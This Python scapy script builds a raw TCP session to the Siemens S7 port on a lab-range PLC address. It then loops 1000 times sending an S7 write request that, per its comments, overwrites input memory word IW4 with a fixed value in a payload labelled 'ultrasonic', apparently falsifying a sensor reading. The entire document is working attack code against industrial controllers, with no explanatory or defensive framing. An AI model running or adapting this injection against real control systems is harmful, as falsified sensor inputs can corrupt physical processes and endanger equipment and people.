#!/usr/local/bin/python
import sys
from scapy.all import *
from binascii import unhexlify
sport= random.randint(1024,2000)
#SYN
ip=IP(src='192.168.56.56',dst='192.168.56.10',proto=6,flags=2)
SYN=TCP(sport=sport,dport=102,flags='S')
SYNACK=sr1(ip/SYN)
#ACK
ACK=TCP(sport=sport,dport=102,flags='A',seq=1,ack=SYNACK.seq+1)
send(ip/ACK)
#CONNECTION REQUEST
header_1= TCP(sport=sport, dport=102, flags='PA', seq=1, ack=SYNACK.seq+1)
protocol="\x03\x00\x00\x16\x11\xe0\x00\x00\x00\x01\x00\xc0\x01\x0a\xc1\x02\x01\x00\xc2\x02\x01\x01"
rsp_1 = sr1(ip/header_1/protocol)
#SETUP COMMUNICATION
header_2 = TCP(sport=sport, dport=102, flags='PA', seq=rsp_1.ack, ack=rsp_1.len+rsp_1.seq-40)
proto_2="\x03\x00\x00\x19\x02\xf0\x80\x32\x01\x00\x00\x00\x00\x00\x08\x00\x00\xf0\x00\x00\x01\x00\x01\x01\xe0"
rsp_1 = sr1(ip/header_2/proto_2)
#SENDING ACK
s71PA=TCP(sport=sport,dport=102,flags='A',seq=rsp_1.ack, ack=rsp_1.len+rsp_1.seq-40)
send(ip/s71PA)
i=0
while i<1000:
    #\x03\x00\x00\x25\x02\xf0\x80\x32\x01\x00\x00\x02\x00\x00\x0e\x00\x06
    #\x05 WRITING A VALUE
    #\x01\x12\x0a\x10\x02\x00\x02\x00\x00
    #\x81 INPUT MEMORY (I)
    #\x00\x00\x20  BYTE ADDRESS (IW4)
    #\x00
    #\x04 WORD
    #\x00\x10 LENGTH
    #\x07\x74 NEW VALUE TO WRITE
    header=TCP(sport=sport, dport=102, flags='PA', seq=rsp_1.ack, ack=rsp_1.len+rsp_1.seq-40) 
    ultrasonic ="\x03\x00\x00\x25\x02\xf0\x80\x32\x01\x00\x00\x02\x00\x00\x0e\x00\x06\x05\x01\x12\x0a\x10\x02\x00\x02\x00\x00\x81\x00\x00\x20\x00\x04\x00\x10\x07\x74"
    rsp_1 = sr1(ip/header/ultrasonic)
    s71PA=TCP(sport=sport,dport=102,flags='A',seq=rsp_1.ack, ack=rsp_1.len+rsp_1.seq-40)
    send(ip/s71PA)
    i+=1
